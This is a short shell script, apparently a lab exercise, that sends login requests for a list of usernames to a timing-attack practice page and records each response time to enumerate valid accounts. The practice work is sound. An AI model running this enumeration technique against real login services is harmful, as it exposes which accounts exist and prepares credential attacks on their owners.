#!/bin/sh
i=0;
while read username
do
	usernames[$i]=$username
	i=$((i+1));
done < boy

for (( j=0; j < 1000; j++ ))
do
	curl "https://authlab.digi.ninja/Timing_Login" --data "username=${usernames[$j]}&password=1" -w "%{time_total}\n" >> tt
done
